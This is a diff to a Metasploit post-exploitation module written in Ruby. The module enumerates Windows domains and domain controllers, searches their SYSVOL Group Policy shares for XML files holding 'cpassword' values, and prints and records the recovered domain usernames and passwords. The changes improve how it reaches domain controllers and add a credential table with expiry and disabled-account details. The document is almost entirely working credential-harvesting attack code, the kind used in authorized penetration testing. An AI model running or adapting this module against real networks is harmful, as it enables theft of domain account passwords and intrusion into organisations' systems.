@@ -47,8 +47,7 @@ class Metasploit3 < Msf::Post
 
 		register_options([
 			OptBool.new('ALL', [ false, 'Enumerate all domains on network.', true]),
-       		OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains DOMAINS="dom1 dom2".'])], self.class)
-
+			OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains DOMAINS="dom1 dom2".'])], self.class)
 	end
 
 	def run
@@ -63,34 +62,50 @@ class Metasploit3 < Msf::Post
 		task_path = "MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
 		task_path_user = "USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
 
-		windir = client.fs.file.expand_path("%SYSTEMROOT%\\SYSVOL")
-
-
 		domains = []
 		dcs = []
 		basepaths = []
 		fullpaths = []
 
 		print_status "Checking locally.."
-		basepaths << get_basepaths(client.fs.file.expand_path("%SYSTEMROOT%\\SYSVOL"))
+		locals = get_basepaths(client.fs.file.expand_path("%SYSTEMROOT%\\SYSVOL\\sysvol"))
+		unless locals.blank?
+			basepaths << locals
+			print_good "Policy Sahres found locally"
+		end
 
-		if datastore['ALL']
+		if datastore['ALL'] and datastore['DOMAINS'].empty?
 			domains = enum_domains
 			domains.reject!{|n| n == "WORKGROUP"}
 		end
 
-		datastore.split('').each{|ud| domains << ud} if datastore['DOMAINS']
+		datastore['DOMAINS'].split('').each{|ud| domains << ud} if datastore['DOMAINS']
 		domains << get_domain_reg
 		domains.flatten!
 		domains.compact!
+		domains.uniq!
 
-		domains.each{ |domain| dcs << enum_dcs(domain)}
-		dcs.flatten!
-		dcs.compact!
-		dcs.each{ |dc| basepaths << get_basepaths("\\\\#{dc}\\SYSVOL") }
+
+		domains.each do |domain| 
+			dcs = enum_dcs(domain)
+			dcs.uniq!
+			tbase = []
+			dcs.each do |dc| 
+				print_status "Searching for Policy Share on #{dc}..."
+				tbase = get_basepaths("\\\\#{dc}\\SYSVOL")
+				#If we got a basepath from the DC we know that we can reach it
+				#All DCs on the same domain should be the same so we only need one
+				unless tbase.blank?
+					print_good "Found Policy Share on #{dc}"
+					basepaths << tbase
+					break
+				end
+			end
+		end
 
 		basepaths.flatten!
 		basepaths.compact!
+		print_status "Searching for Group Policy XML Files..."
 		basepaths.each do |policy_path|
 			fullpaths << find_path(policy_path, group_path)
 			fullpaths << find_path(policy_path, group_path_user)
@@ -154,6 +169,7 @@ class Metasploit3 < Msf::Post
 			retobj = {
 				:domain => spath[2],
 				:dc     => spath[0],
+				:path   => path,
 				:xml    => REXML::Document.new(data).root
 			}	
 			return retobj
@@ -165,6 +181,7 @@ class Metasploit3 < Msf::Post
 
 	def parse_xml(xmlfile)
 		mxml = xmlfile[:xml]
+		print_status "Parsing file: #{xmlfile[:path]} ..."
 		mxml.elements.to_a("//Properties").each do |node|
 			epassword = node.attributes['cpassword']
 			next if epassword.to_s.empty?
@@ -174,10 +191,35 @@ class Metasploit3 < Msf::Post
 			user = node.attributes['accountName'] if node.attributes['accountName']
 			user = node.attributes['username'] if  node.attributes['username']
 			user = node.attributes['userName'] if  node.attributes['userName']
-			user = node.attributes['newName'] if  node.attributes['newName']
+			user = node.attributes['newName'] unless  node.attributes['newName'].blank?
+			changed = node.parent.attributes['changed']
 
-			print_good "DOMAIN CONTROLLER: #{xmlfile[:dc]} DOMAIN: #{xmlfile[:domain]} USER: #{user} PASS: #{pass} "
-			report_creds(user,pass)
+			expires = node.attributes['expires'] 
+			never_expires = node.attributes['neverExpires']
+			disabled = node.attributes['acctDisabled']
+
+
+			table = Rex::Ui::Text::Table.new(
+				'Header'  => 'Group Policy Credential Info',
+				'Indent'   => 1,
+				'Columns' =>
+				[
+					'Name',
+					'Value',
+				]
+			)
+			table << ["DOMAIN CONTROLLER", xmlfile[:dc]]
+			table << ["DOMAIN", xmlfile[:domain] ]
+			table << ["USERNAME", user ]
+			table << ["PASSWORD", pass]
+			table << ["CHANGED", changed]
+			table << ["EXPIRES", expires] unless expires.blank?
+			table << ["NEVER_EXPIRES?", never_expires] unless never_expires.blank?
+			table << ["DISABLED", disabled] unless disabled.blank?
+
+
+			print_good table.to_s
+			report_creds(user,pass) unless disabled and disabled == '1'
 		end
 	end
 
@@ -297,7 +339,7 @@ class Metasploit3 < Msf::Post
 			subkey = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\"
 			v_name = "Domain"
 			domain = registry_getvaldata(subkey, v_name)
-			print_status "domain #{domain.inspect}"
+			print_status "Retrieved domain #{domain} from registry "
 		rescue Rex::Post::Meterpreter::RequestError => e
 			print_error "Received error code #{e.code} - #{e.message} when reading the registry."
 		end
